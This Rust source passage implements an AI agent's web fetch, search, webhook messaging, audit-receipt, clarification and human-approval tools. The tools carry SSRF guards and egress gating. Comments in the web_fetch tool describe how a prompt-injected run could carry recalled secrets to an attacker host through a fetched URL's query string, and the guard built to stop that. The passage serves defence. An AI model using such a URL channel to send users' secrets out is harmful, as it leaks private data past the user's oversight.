            "https://api.search.brave.com/res/v1/web/search?q={}&count=8",
            urlencoding(query)
        );
        let target = super::resolve_guarded(&url).await?;
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(timeout))
            .redirect(reqwest::redirect::Policy::none())
            .resolve_to_addrs(&target.host, &target.addrs)
            .build()
            .map_err(|e| e.to_string())?;
        let resp = client
            .get(&url)
            .header("X-Subscription-Token", key)
            .header(reqwest::header::ACCEPT, "application/json")
            .send()
            .await
            .map_err(|e| e.to_string())?;
        if !resp.status().is_success() {
            return Err(format!("brave api HTTP {}", resp.status().as_u16()));
        }
        let body = resp.text().await.map_err(|e| e.to_string())?;
        let v: serde_json::Value = serde_json::from_str(&body).map_err(|e| e.to_string())?;
        let mut out = Vec::new();
        if let Some(results) = v["web"]["results"].as_array() {
            for r in results {
                let title = r["title"].as_str().unwrap_or("").trim().to_string();
                let href = r["url"].as_str().unwrap_or("").trim().to_string();
                let desc = r["description"]
                    .as_str()
                    .map(|s| super::html_to_text(s).trim().to_string())
                    .filter(|s| !s.is_empty());
                if !title.is_empty() && !href.is_empty() {
                    out.push(with_snippet(&title, &href, desc));
                }
            }
        }
        Ok(out)
    }

    /// Query a SearXNG instance (keyless, free, self-hostable metasearch) at `base`.
    /// Point it at your own instance or a public one that allows the JSON API.
    async fn searxng_search(base: &str, query: &str, timeout: u64) -> Result<Vec<String>, String> {
        let url = format!(
            "{}/search?q={}&format=json&safesearch=1",
            base.trim_end_matches('/'),
            urlencoding(query)
        );
        // The user configured this SearXNG URL, so it's trusted — allow localhost / LAN instances
        // (the common self-hosted setup) that the public-only SSRF guard would otherwise refuse.
        let target = super::resolve_trusted(&url).await?;
        let client = reqwest::Client::builder()
            .user_agent("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
            .timeout(Duration::from_secs(timeout))
            .redirect(reqwest::redirect::Policy::none())
            .resolve_to_addrs(&target.host, &target.addrs)
            .build()
            .map_err(|e| e.to_string())?;
        let resp = client.get(&url).send().await.map_err(|e| e.to_string())?;
        if !resp.status().is_success() {
            return Err(format!("searxng HTTP {}", resp.status().as_u16()));
        }
        let body = resp.text().await.map_err(|e| e.to_string())?;
        let v: serde_json::Value = serde_json::from_str(&body).map_err(|e| e.to_string())?;
        let mut out = Vec::new();
        if let Some(results) = v["results"].as_array() {
            for r in results {
                let title = r["title"].as_str().unwrap_or("").trim().to_string();
                let href = r["url"].as_str().unwrap_or("").trim().to_string();
                let desc = r["content"]
                    .as_str()
                    .map(|s| s.trim().to_string())
                    .filter(|s| !s.is_empty());
                if !title.is_empty() && !href.is_empty() {
                    out.push(with_snippet(&title, &href, desc));
                }
            }
        }
        Ok(out)
    }

    /// Query the Tavily API (POST JSON) — a reliable search with a FREE, no-credit-card tier
    /// (1000 queries/month). Used when `TAVILY_API_KEY` is set. Returns lines, or Err to fall back.
    async fn tavily_search(query: &str, key: &str, timeout: u64) -> Result<Vec<String>, String> {
        let url = "https://api.tavily.com/search";
        let target = super::resolve_guarded(url).await?;
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(timeout))
            .redirect(reqwest::redirect::Policy::none())
            .resolve_to_addrs(&target.host, &target.addrs)
            .build()
            .map_err(|e| e.to_string())?;
        let payload = serde_json::json!({
            "api_key": key, "query": query, "max_results": 8, "search_depth": "basic"
        })
        .to_string();
        let resp = client
            .post(url)
            .header(reqwest::header::CONTENT_TYPE, "application/json")
            .body(payload)
            .send()
            .await
            .map_err(|e| e.to_string())?;
        if !resp.status().is_success() {
            return Err(format!("tavily HTTP {}", resp.status().as_u16()));
        }
        let text = resp.text().await.map_err(|e| e.to_string())?;
        let v: serde_json::Value = serde_json::from_str(&text).map_err(|e| e.to_string())?;
        let mut out = Vec::new();
        if let Some(results) = v["results"].as_array() {
            for r in results {
                let title = r["title"].as_str().unwrap_or("").trim().to_string();
                let href = r["url"].as_str().unwrap_or("").trim().to_string();
                let desc = r["content"]
                    .as_str()
                    .map(|s| s.trim().to_string())
                    .filter(|s| !s.is_empty());
                if !title.is_empty() && !href.is_empty() {
                    out.push(with_snippet(&title, &href, desc));
                }
            }
        }
        Ok(out)
    }

    pub struct WebFetchTool;

    #[async_trait]
    impl Tool for WebFetchTool {
        fn name(&self) -> &str {
            "web_fetch"
        }
        fn description(&self) -> &str {
            "Fetch a URL and return its readable text content."
        }
        fn schema(&self) -> Value {
            json!({ "type": "object", "properties": { "url": { "type": "string" } }, "required": ["url"] })
        }
        fn taints(&self) -> bool {
            true
        }
        // Fetching a URL to READ its content is research/ingress (SSRF-guarded), not exfiltration,
        // so it is NOT egress - otherwise the trifecta blocked all web research the moment the run
        // had recalled any memory. The clear data-out channel (send_message) stays egress-gated.
        fn is_egress(&self) -> bool {
            false
        }
        async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
            let url = arg_str(args, "url")?;
            super::guard_url(url).await?;
            // Close the GET-exfiltration channel on a trifecta run (unless the user approved this run):
            // a fetch's URL query/path can carry recalled secrets to a public attacker host that the
            // SSRF guard doesn't block. Clean research URLs still pass.
            let trifecta = ctx.taint.is_untrusted() && ctx.sensitive && !ctx.policy.approved;
            super::guard_exfil_url(url, trifecta)?;
            let _ = ctx.ledger.append(
                "agent.web_fetch",
                "agent",
                json!({ "url": url, "dest": crate::agent::host_of(url) }),
            );
            let to = ctx.policy.timeout_secs;
            // Direct fetch first (fast, no third party). If it errors or yields almost no readable
            // text (a JS-only shell or a bot-block page), fall back to the Jina reader proxy, which
            // renders the page server-side and returns clean markdown — reliable for SPA/JS pages
            // WITHOUT slow, brittle browser automation. Reader fallback only on a poor direct result.
            let direct = get_text(url, to).await.map(|h| super::html_to_text(&h));
            if let Ok(text) = &direct {
                if text.trim().len() >= 200 {
                    return Ok(text.clone());
                }
            }
            // The Jina reader fallback sends the FULL target URL to a THIRD PARTY (r.jina.ai). For a
            // local-first, auditable-egress product that is a disclosure the user must opt into: it's
            // OFF unless ENGRAM_JINA_FALLBACK is set truthy, we ledger the proxied fetch naming the
            // proxy host as the destination, and we NEVER proxy a URL carrying a query string or
            // userinfo (which could leak a capability token / share link off-device).
            if jina_fallback_enabled() && jina_safe_to_proxy(url) {
                let _ = ctx.ledger.append(
                    "agent.web_fetch_proxied",
                    "agent",
                    json!({ "url": url, "dest": "r.jina.ai", "proxy": "r.jina.ai" }),
                );
                if let Ok(read) = jina_read(url, to).await {
                    if read.trim().len() >= 200 {
                        return Ok(read);
                    }
                }
            }
            direct // the (possibly thin) direct result, or its original error
        }
    }

    /// Whether the third-party Jina reader fallback is enabled. Default OFF (local-first / auditable
    /// egress): set `ENGRAM_JINA_FALLBACK=1` (or true/yes/on) to opt in. The daemon can surface this
    /// as a Settings → Web toggle that sets the env var.
    fn jina_fallback_enabled() -> bool {
        std::env::var("ENGRAM_JINA_FALLBACK")
            .ok()
            .map(|v| {
                matches!(
                    v.trim().to_ascii_lowercase().as_str(),
                    "1" | "true" | "yes" | "on"
                )
            })
            .unwrap_or(false)
    }

    /// Never hand a URL with a query string, fragment, or userinfo to the proxy — those are exactly
    /// where signed/capability tokens and private share parameters live, and disclosing them to a
    /// third party is the leak we're guarding against.
    fn jina_safe_to_proxy(url: &str) -> bool {
        let after = url.split_once("://").map(|(_, b)| b).unwrap_or(url);
        !after.contains('?') && !after.contains('#') && !after.contains('@')
    }

    /// Read a page via the Jina reader proxy (r.jina.ai) — renders JS server-side and returns clean
    /// markdown. Free, no key, no browser. A reliable fallback for pages a raw fetch can't read.
    /// Only called when the user has opted in and the URL is safe to disclose (see the callers above).
    async fn jina_read(url: &str, timeout: u64) -> Result<String, String> {
        // r.jina.ai/<full-url>: the proxy is a public host (SSRF-vetted by get_text); the target URL
        // was already guard_url'd by the caller.
        let proxied = format!("https://r.jina.ai/{url}");
        get_text(&proxied, timeout).await
    }

    pub struct WebSearchTool;

    #[async_trait]
    impl Tool for WebSearchTool {
        fn name(&self) -> &str {
            "web_search"
        }
        fn description(&self) -> &str {
            "Search the web; returns the top results as title, URL, and an inline snippet — often \
             enough to answer without a follow-up web_fetch. To look up SEVERAL things, pass them all \
             in ONE call as a `queries` array — they run concurrently, which is much faster than many \
             separate searches. Reliable when a Tavily/Brave key or SearXNG URL is set; otherwise it \
             scrapes search HTML (can be rate-limited)."
        }
        fn schema(&self) -> Value {
            json!({ "type": "object", "properties": {
                "query": { "type": "string", "description": "a single search query" },
                "queries": { "type": "array", "items": { "type": "string" },
                    "description": "OR a batch of queries to run AT ONCE — prefer this whenever you need to look up several things, so it's one fast round-trip instead of many" }
            } })
        }
        fn taints(&self) -> bool {
            true
        }
        // Searching the web to find sources is research/ingress, not exfiltration (a short query is
        // not a meaningful data-out channel), so it is NOT egress - this is what kept blocking
        // research tasks. The explicit send channel (send_message) remains egress-gated.
        fn is_egress(&self) -> bool {
            false
        }
        async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
            // Accept a single `query` OR a batch of `queries`. Running several searches in ONE call
            // (concurrently) collapses a multi-lookup research task from N model round-trips into one
            // — the biggest agent-side speedup, especially on a slow model.
            let mut queries: Vec<String> = Vec::new();
            if let Some(arr) = args.get("queries").and_then(|v| v.as_array()) {
                for v in arr {
                    if let Some(s) = v.as_str() {
                        let s = s.trim();
                        if !s.is_empty() {
                            queries.push(s.to_string());
                        }
                    }
                }
            }
            if queries.is_empty() {
                if let Ok(q) = arg_str(args, "query") {
                    let q = q.trim();
                    if !q.is_empty() {
                        queries.push(q.to_string());
                    }
                }
            }
            if queries.is_empty() {
                return Err(
                    "web_search needs a 'query' string or a non-empty 'queries' array".into(),
                );
            }
            let to = ctx.policy.timeout_secs;
            if queries.len() == 1 {
                return search_one(queries.pop().unwrap(), to, ctx.ledger.clone()).await;
            }
            // Batch: run up to 10 queries concurrently, label each result block by its query.
            queries.truncate(10);
            let mut set = tokio::task::JoinSet::new();
            for (i, qq) in queries.into_iter().enumerate() {
                let ledger = ctx.ledger.clone();
                set.spawn(async move {
                    let res = search_one(qq.clone(), to, ledger)
                        .await
                        .unwrap_or_else(|e| format!("(failed: {e})"));
                    (i, format!("### {qq}\n{res}"))
                });
            }
            let mut blocks: Vec<(usize, String)> = Vec::new();
            while let Some(r) = set.join_next().await {
                if let Ok(pair) = r {
                    blocks.push(pair);
                }
            }
            blocks.sort_by_key(|(i, _)| *i);
            Ok(blocks
                .into_iter()
                .map(|(_, b)| b)
                .collect::<Vec<_>>()
                .join("\n\n"))
        }
    }

    /// A scrape-fallback search engine: a results-page URL prefix + the parser for its HTML.
    type ScrapeEngine = (&'static str, fn(&str) -> Vec<String>);

    /// Run ONE web_search query: the provider cascade (Tavily → Brave → SearXNG when configured),
    /// then keyless HTML scraping. Owned args (so it can be `spawn`ed to run a batch concurrently).
    async fn search_one(
        query: String,
        timeout: u64,
        ledger: std::sync::Arc<engram_core::Ledger>,
    ) -> Result<String, String> {
        let _ = ledger.append("agent.web_search", "agent", json!({ "query": query }));
        let q = urlencoding(&query);
        let envv = |k: &str| {
            std::env::var(k)
                .ok()
                .map(|v| v.trim().to_string())
                .filter(|v| !v.is_empty())
        };
        let join8 = |r: Vec<String>| r.into_iter().take(8).collect::<Vec<_>>().join("\n");
        if let Some(key) = envv("TAVILY_API_KEY") {
            if let Ok(r) = tavily_search(&query, &key, timeout).await {
                if !r.is_empty() {
                    return Ok(join8(r));
                }
            }
        }
        if let Some(key) = envv("BRAVE_API_KEY").or_else(|| envv("BRAVE_SEARCH_API_KEY")) {
            if let Ok(r) = brave_api_search(&query, &key, timeout).await {
                if !r.is_empty() {
                    return Ok(join8(r));
                }
            }
        }
        if let Some(base) = envv("SEARXNG_URL") {
            if let Ok(r) = searxng_search(&base, &query, timeout).await {
                if !r.is_empty() {
                    return Ok(join8(r));
                }
            }
        }
        // Fallback: scrape Brave/DDG HTML — Brave, then DDG, then DDG-lite; first with results wins.
        let attempts: [ScrapeEngine; 3] = [
            ("https://search.brave.com/search?q=", extract_brave_results),
            ("https://html.duckduckgo.com/html/?q=", extract_results),
            ("https://lite.duckduckgo.com/lite/?q=", extract_results),
        ];
        let mut last_err = String::new();
        for (base, parse) in attempts {
            match get_text(&format!("{base}{q}"), timeout).await {
                Ok(html) => {
                    let results = parse(&html);
                    if !results.is_empty() {
                        return Ok(results.into_iter().take(8).collect::<Vec<_>>().join("\n"));
                    }
                }
                Err(e) => last_err = e,
            }
        }
        if last_err.is_empty() {
            Ok("(no results)".into())
        } else {
            Err(format!(
                "web search unavailable (all engines failed): {last_err}"
            ))
        }
    }

    pub struct SendMessageTool;

    #[async_trait]
    impl Tool for SendMessageTool {
        fn name(&self) -> &str {
            "send_message"
        }
        fn description(&self) -> &str {
            "Send a message to a chat channel via an incoming webhook (Slack / Discord / \
             Mattermost style). Pass 'url' or set ENGRAM_WEBHOOK_URL."
        }
        fn is_egress(&self) -> bool {
            true
        }
        fn side_effecting(&self) -> bool {
            true
        }
        // Resolve the destination the tool WILL ACTUALLY contact, in the SAME precedence `run` uses:
        // explicit `url` > the configured webhook (settings) > ENGRAM_WEBHOOK_URL. This is what lets
        // the autonomy gate allowlist the user's own configured channel even for a url-less digest,
        // and stops a decoy `url` from spoofing the gate (there's no other recipient arg here, but the
        // gate now trusts the tool's answer rather than scanning arbitrary keys of model JSON).
        fn egress_dest(&self, args: &Value, ctx: &ToolCtx) -> Option<String> {
            let url = args["url"]
                .as_str()
                .map(str::to_string)
                .filter(|s| !s.trim().is_empty())
                .or_else(|| ctx.policy.webhook_url.clone())
                .or_else(|| std::env::var("ENGRAM_WEBHOOK_URL").ok())?;
            let url = url.trim();
            if url.is_empty() {
                return None;
            }
            Some(crate::agent::host_of(url))
        }
        fn schema(&self) -> Value {
            json!({ "type": "object",
                "properties": { "text": { "type": "string" }, "url": { "type": "string" } },
                "required": ["text"] })
        }
        async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
            let text = arg_str(args, "text")?;
            // Precedence: explicit per-call url > the default from settings (Integrations) >
            // the ENGRAM_WEBHOOK_URL env var. resolve_guarded below SSRF-validates the winner.
            let url = args["url"]
                .as_str()
                .map(String::from)
                .or_else(|| ctx.policy.webhook_url.clone())
                .or_else(|| std::env::var("ENGRAM_WEBHOOK_URL").ok())
                .ok_or("no webhook url (pass 'url', set one in Integrations, or set ENGRAM_WEBHOOK_URL)")?;
            let target = super::resolve_guarded(&url).await?;
            let _ = ctx.ledger.append(
                "agent.send_message",
                "agent",
                json!({ "chars": text.len() }),
            );
            let client = reqwest::Client::builder()
                .timeout(Duration::from_secs(ctx.policy.timeout_secs))
                // Pin to the vetted IP and never auto-follow a redirect to a private address.
                .redirect(reqwest::redirect::Policy::none())
                .resolve_to_addrs(&target.host, &target.addrs)
                .build()
                .map_err(|e| e.to_string())?;
            // Include both "text" (Slack/Mattermost) and "content" (Discord) for compatibility.
            let resp = client
                .post(&url)
                .json(&json!({ "text": text, "content": text }))
                .send()
                .await
                .map_err(|e| e.to_string())?;
            Ok(format!("sent (http {})", resp.status().as_u16()))
        }
    }

    /// Minimal percent-encoding for a query string.
    fn urlencoding(s: &str) -> String {
        let mut out = String::new();
        for b in s.bytes() {
            match b {
                b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                    out.push(b as char)
                }
                b' ' => out.push('+'),
                _ => out.push_str(&format!("%{b:02X}")),
            }
        }
        out
    }

    /// Pull `result__a` anchors (title + href) AND the `result__snippet` description out of
    /// DuckDuckGo's HTML. Returning the snippet inline is what lets the model judge relevance without
    /// a `web_fetch` per result — the single biggest lever on research budget/latency.
    fn extract_results(html: &str) -> Vec<String> {
        let mut out = Vec::new();
        for chunk in html.split("result__a").skip(1) {
            let href = chunk
                .split_once("href=\"")
                .and_then(|(_, r)| r.split_once('"'))
                .map(|(h, _)| h.to_string());
            let title = chunk
                .split_once('>')
                .and_then(|(_, r)| r.split_once('<'))
                .map(|(t, _)| t.trim().to_string());
            // The snippet anchor (`result__snippet`) follows the title within the same chunk.
            let snippet = snippet_after(chunk, "result__snippet");
            if let (Some(href), Some(title)) = (href, title) {
                if !title.is_empty() {
                    out.push(with_snippet(&title, &href, snippet));
                }
            }
        }
        out
    }

    /// Extract and clean the text of the element whose opening tag follows `marker`, capped for the
    /// result list. Cuts at the element's OWN closing tag (anchor/div/span/p) so inner `<b>`/`<em>`
    /// emphasis inside the snippet isn't mistaken for the end. Returns `None` when absent or empty.
    fn snippet_after(block: &str, marker: &str) -> Option<String> {
        let inner = block
            .split_once(marker)
            .and_then(|(_, r)| r.split_once('>'))
            .map(|(_, r)| r)?;
        let end = ["</a>", "</div>", "</p>", "</span>"]
            .iter()
            .filter_map(|t| inner.find(t))
            .min()
            .unwrap_or_else(|| inner.len().min(500));
        let s = super::html_to_text(&inner[..end])
            .trim()
            .chars()
            .take(240)
            .collect::<String>();
        if s.is_empty() {
            None
        } else {
            Some(s)
        }
    }

    /// Format one search result as `- Title :: URL` with the snippet on an indented next line.
    fn with_snippet(title: &str, href: &str, snippet: Option<String>) -> String {
        match snippet {
            Some(s) => format!("- {title} :: {href}\n    {s}"),
            None => format!("- {title} :: {href}"),
        }
    }

    /// Parse Brave Search HTML: each web result follows `data-type="web"` and carries an
    /// `href="URL"` plus a `class="title…">Title`. Brave returns server-rendered results without an
    /// API key and is the most reliable scrape target — DuckDuckGo blocks many networks outright and
    /// Bing serves a JS-only shell with no parseable results. Titles are tag-stripped.
    fn extract_brave_results(html: &str) -> Vec<String> {
        let mut out = Vec::new();
        for block in html.split("data-type=\"web\"").skip(1) {
            let block = &block[..block.len().min(4000)];
            // First external (non-Brave) http link in the block is the result URL.
            let href = block
                .split("href=\"")
                .skip(1)
                .filter_map(|s| s.split_once('"').map(|(h, _)| h))
                .find(|h| h.starts_with("http") && !h.contains("brave.com"))
                .map(|h| h.to_string());
            let title = block
                .split_once("class=\"title")
                .and_then(|(_, r)| r.split_once('>'))
                .and_then(|(_, r)| r.split_once("</"))
                .map(|(t, _)| super::html_to_text(t).trim().to_string())
                .filter(|t| !t.is_empty());
            // Brave's per-result description carries a `class="snippet…"`; surface it inline.
            let snippet = snippet_after(block, "class=\"snippet");
            if let (Some(href), Some(title)) = (href, title) {
                out.push(with_snippet(&title, &href, snippet));
            }
        }
        // Brave varies its markup under bot-detection (sometimes the structured blocks don't carry a
        // direct href). Fall back to a broad scan of external result anchors so we still return
        // something usable instead of "(no results)".
        if out.is_empty() {
            out = broad_result_links(html);
        }
        out
    }

    /// Last-resort extractor: pull external (non-search-engine, non-asset) `<a href="https://…">Text`
    /// links from any results HTML, deduped. Less precise than a per-engine parser but resilient to
    /// markup changes / shell variants.
    fn broad_result_links(html: &str) -> Vec<String> {
        let skip = [
            "brave.com",
            "duckduckgo",
            "bing.com",
            "google.",
            "microsoft.com",
            "gstatic",
            "w3.org",
            "schema.org",
            "/cdn",
            "javascript:",
        ];
        let mut seen = std::collections::HashSet::new();
        let mut out = Vec::new();
        for chunk in html.split("href=\"https").skip(1) {
            let Some((rest, after)) = chunk.split_once('"') else {
                continue;
            };
            let href = format!("https{rest}");
            if skip.iter().any(|s| href.contains(s)) || !seen.insert(href.clone()) {
                continue;
            }
            // Title = the anchor's visible text (tags stripped), if any.
            let title = after
                .split_once('>')
                .and_then(|(_, r)| r.split_once("</a>"))
                .map(|(t, _)| super::html_to_text(t).trim().to_string())
                .filter(|t| t.len() >= 8)
                .unwrap_or_default();
            if !title.is_empty() {
                out.push(format!("- {title} :: {href}"));
            }
            if out.len() >= 10 {
                break;
            }
        }
        out
    }

    #[cfg(test)]
    mod tests {
        use super::*;

        #[test]
        fn strips_html_to_text() {
            let html = "<html><head><style>x{}</style></head><body><h1>Hi</h1><script>bad()</script><p>there</p></body></html>";
            let text = super::super::html_to_text(html);
            assert!(text.contains("Hi") && text.contains("there"));
            assert!(!text.contains("bad") && !text.contains('{'));
        }

        #[test]
        fn ddg_results_carry_inline_snippets() {
            // Two results; the second has no snippet element — must degrade to title :: url only.
            let html = "\
                <a class=\"result__a\" href=\"https://a.example/p\">Alpha Title</a>\
                <a class=\"result__snippet\" href=\"x\">Alpha is the first <b>described</b> result.</a>\
                <a class=\"result__a\" href=\"https://b.example/q\">Beta Title</a>";
            let r = extract_results(html);
            assert_eq!(r.len(), 2, "got: {r:?}");
            assert!(r[0].contains("Alpha Title :: https://a.example/p"));
            assert!(
                r[0].contains("Alpha is the first described result."),
                "snippet inline: {:?}",
                r[0]
            );
            assert!(
                r[1].ends_with("Beta Title :: https://b.example/q"),
                "no-snippet degrades: {:?}",
                r[1]
            );
        }

        #[tokio::test]
        #[ignore = "network"]
        async fn fetches_a_real_page() {
            let html = get_text("https://example.com", 15).await.unwrap();
            assert!(html_to_text(&html).contains("Example Domain"));
        }

        #[tokio::test]
        #[ignore = "network"]
        async fn searches_the_real_web() {
            let html = get_text("https://html.duckduckgo.com/html/?q=rust+programming", 15)
                .await
                .unwrap();
            assert!(
                !extract_results(&html).is_empty(),
                "expected search results"
            );
        }
    }
}

// ---------------------------------------------------------------------------
// proof_of_action — verifiable receipts from the signed audit ledger
// ---------------------------------------------------------------------------

/// Produce a tamper-evident RECEIPT of what the agent actually did, verified against the signed,
/// hash-chained audit ledger. A capability most agents structurally cannot offer: their actions are
/// unattested, so "prove what you did" has no honest answer. Here every consequential action is a
/// signed ledger entry, and this tool (a) re-verifies the whole chain — every content hash and
/// Ed25519 signature — so tampering is detected, then (b) returns the matching entries with their
/// content hashes and the public key needed to verify them OFFLINE.
///
/// Read-only and intentionally a RECEIPT, not a data dump: payloads are hard-truncated so it can
/// never become a bulk private-memory egress channel (the private content lives in `memory_recall`,
/// which is sensitive-gated). Hence `reads_sensitive` stays false.
pub struct ProofOfActionTool;

#[async_trait]
impl Tool for ProofOfActionTool {
    fn name(&self) -> &str {
        "proof_of_action"
    }
    fn description(&self) -> &str {
        "Produce a tamper-evident, cryptographically verifiable receipt of actions the agent has \
         taken, checked against the signed audit ledger (re-verifies every hash + signature). Use \
         when the user asks to prove, audit, show a record of, or get receipts for what was done. \
         Optional filters: kind (e.g. \"send\", \"skill\", \"memory\"), actor, since_ms, limit."
    }
    fn schema(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "kind": { "type": "string", "description": "substring filter on the action kind (e.g. send, skill, memory, web_fetch)" },
                "actor": { "type": "string", "description": "substring filter on who acted (e.g. user, agent, skill:...)" },
                "since_ms": { "type": "integer", "description": "only entries at/after this Unix-epoch-millisecond time" },
                "limit": { "type": "integer", "description": "max entries to show (default 20, max 200)" }
            }
        })
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        let kind_f = args["kind"].as_str().map(|s| s.to_lowercase());
        let actor_f = args["actor"].as_str().map(|s| s.to_lowercase());
        let since = args["since_ms"].as_u64();
        let limit = args["limit"].as_u64().unwrap_or(20).clamp(1, 200) as usize;

        // Integrity proof FIRST — the entire point is that the record cannot be quietly rewritten.
        let integrity = ctx.ledger.verify();
        let entries = ctx.ledger.read_all().map_err(|e| e.to_string())?;
        let total = entries.len();
        let matched: Vec<_> = entries
            .into_iter()
            .filter(|e| {
                kind_f
                    .as_ref()
                    .is_none_or(|k| e.kind.to_lowercase().contains(k))
                    && actor_f
                        .as_ref()
                        .is_none_or(|a| e.actor.to_lowercase().contains(a))
                    && since.is_none_or(|s| e.ts_ms >= s)
            })
            .collect();
        let (tip_seq, tip_hash) = ctx.ledger.head();

        let mut out = String::new();
        match integrity {
            Ok(n) => out.push_str(&format!(
                "✔ Verifiable action receipt — audit chain intact ({n} entries re-verified: every hash + signature checks out, tamper-evident).\n"
            )),
            Err(e) => out.push_str(&format!(
                "✗ LEDGER INTEGRITY CHECK FAILED ({e}). The record below may have been tampered with — treat with suspicion.\n"
            )),
        }
        out.push_str(&format!(
            "Public key (verify offline): {}\n",
            ctx.ledger.pubkey_hex()
        ));
        out.push_str(&format!(
            "Chain tip: seq {tip_seq}, hash {}…\n\n",
            short_hash(&tip_hash)
        ));

        let shown: Vec<_> = matched.iter().rev().take(limit).collect();
        out.push_str(&format!(
            "Showing {} of {} matching action(s) ({} total ledger entries):\n",
            shown.len(),
            matched.len(),
            total
        ));
        for e in &shown {
            let preview: String = e.payload.get().chars().take(140).collect();
            out.push_str(&format!(
                "#{:<6} {}  {:<18} by {:<16} hash={}…  {}\n",
                e.seq,
                fmt_ts_utc(e.ts_ms),
                e.kind,
                e.actor,
                short_hash(&e.hash),
                preview.replace('\n', " ")
            ));
        }
        if shown.is_empty() {
            out.push_str("(no matching actions recorded yet)\n");
        }
        Ok(out)
    }
    // Read-only audit metadata: not side-effecting, not egress, doesn't taint. Payloads are
    // truncated so it stays a receipt, never a private-data egress channel.
}

/// First 10 hex chars of a content hash, for compact display.
fn short_hash(h: &str) -> &str {
    &h[..h.len().min(10)]
}

/// Epoch milliseconds -> "YYYY-MM-DDTHH:MM:SSZ" (UTC). Dependency-free (Hinnant civil-from-days), so
/// the small build doesn't gain a date crate just to label a receipt.
fn fmt_ts_utc(ms: u64) -> String {
    let secs = (ms / 1000) as i64;
    let days = secs.div_euclid(86_400);
    let tod = secs.rem_euclid(86_400);
    let (h, mi, s) = (tod / 3600, (tod % 3600) / 60, tod % 60);
    let z = days + 719_468;
    let era = (if z >= 0 { z } else { z - 146_096 }) / 146_097;
    let doe = z - era * 146_097;
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let y = yoe + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = if m <= 2 { y + 1 } else { y };
    format!("{y:04}-{m:02}-{d:02}T{h:02}:{mi:02}:{s:02}Z")
}

// ---------------------------------------------------------------------------
// clarify — ask the user a focused question instead of guessing
// ---------------------------------------------------------------------------

/// Ask the user ONE focused question when the request is ambiguous, before doing work that might be
/// wrong. The original failure that motivated this whole effort — "cheapest flight Hamburg OR Weeze,
/// some time in July" — had two possible origins and no firm dates; the agent should have asked, not
/// guessed. Presenting ≤4 concrete options makes the question machine-renderable (buttons) and the
/// request is recorded to the ledger. The tool registers + audits the question and instructs the
/// model to stop and present it; the daemon surfaces it and a later turn carries the answer.
pub struct ClarifyTool;

#[async_trait]
impl Tool for ClarifyTool {
    fn name(&self) -> &str {
        "clarify"
    }
    fn description(&self) -> &str {
        "Ask the user ONE focused clarifying question when the request is ambiguous or \
         under-specified, BEFORE doing work that could be wrong. Provide up to 4 concrete options \
         when there's a small choice set. After calling this, STOP and present the question — do \
         not guess or call more tools until the user answers."
    }
    fn schema(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "question": { "type": "string", "description": "the single, specific question to ask" },
                "options": {
                    "type": "array",
                    "items": { "type": "string" },
                    "description": "up to 4 concrete choices the user can pick from (optional)"
                }
            },
            "required": ["question"]
        })
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        let question = arg_str(args, "question")?.trim().to_string();
        if question.is_empty() {
            return Err("'question' must not be empty".into());
        }
        let options: Vec<String> = args["options"]
            .as_array()
            .map(|a| {
                a.iter()
                    .filter_map(|v| v.as_str())
                    .map(|s| s.trim().to_string())
                    .filter(|s| !s.is_empty())
                    .take(4) // ≤4 keeps it renderable as a tidy choice set
                    .collect()
            })
            .unwrap_or_default();
        let _ = ctx.ledger.append(
            "agent.clarify",
            "agent",
            json!({ "question": question, "options": options }),
        );
        let mut out = String::from(
            "Clarification requested and logged. Reply to the user with this question now and STOP \
             — call no further tools until they answer:\n\nQ: ",
        );
        out.push_str(&question);
        if !options.is_empty() {
            out.push_str("\nOptions:");
            for (i, o) in options.iter().enumerate() {
                out.push_str(&format!("\n  {}. {o}", i + 1));
            }
        }
        Ok(out)
    }
    // Asking a question changes nothing in the world: not side-effecting, not egress, not tainting.
}

// ---------------------------------------------------------------------------
// request_approval — ask the user to authorize a risky/irreversible action
// ---------------------------------------------------------------------------

/// Ask the user to authorize a risky, irreversible, or data-sending action BEFORE it runs —
/// especially when the run has read untrusted content and the trifecta has blocked egress. The model
/// can only REQUEST approval; it can never grant its own (only the daemon sets `policy.approved`, and
/// only after a real human approval). The request is recorded to the ledger; the daemon surfaces it
/// and, on approval, resumes the run with egress de-escalated — so the gate protects without
/// becoming "refuses everything". The counterpart to [`ClarifyTool`] for *authorization* rather than
/// *information*.
pub struct RequestApprovalTool;

#[async_trait]
impl Tool for RequestApprovalTool {
    fn name(&self) -> &str {
        "request_approval"
    }
    fn description(&self) -> &str {
        "Request the user's explicit approval before an irreversible or data-sending action (send a \
         message/email, post, pay, delete, overwrite) — especially when this run has read untrusted \
         content and egress is blocked. Describe exactly what you want to do and why. After calling \
         this, STOP; the action stays blocked until the user approves. You cannot approve your own request."
    }
    fn schema(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "action": { "type": "string", "description": "the exact action to authorize" },
                "reason": { "type": "string", "description": "why it is needed (optional)" }
            },
            "required": ["action"]
        })
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        let action = arg_str(args, "action")?.trim().to_string();
        if action.is_empty() {
            return Err("'action' must not be empty".into());
        }
        let reason = args["reason"].as_str().unwrap_or("").trim().to_string();
        let _ = ctx.ledger.append(
            "agent.approval_request",
            "agent",
            json!({ "action": action, "reason": reason }),
        );
        let mut out = String::from(
            "Approval requested and logged. Present this to the user and STOP — the action stays \
             blocked until they approve (you cannot approve it yourself):\n\nAction: ",
        );
        out.push_str(&action);
        if !reason.is_empty() {
            out.push_str("\nWhy: ");
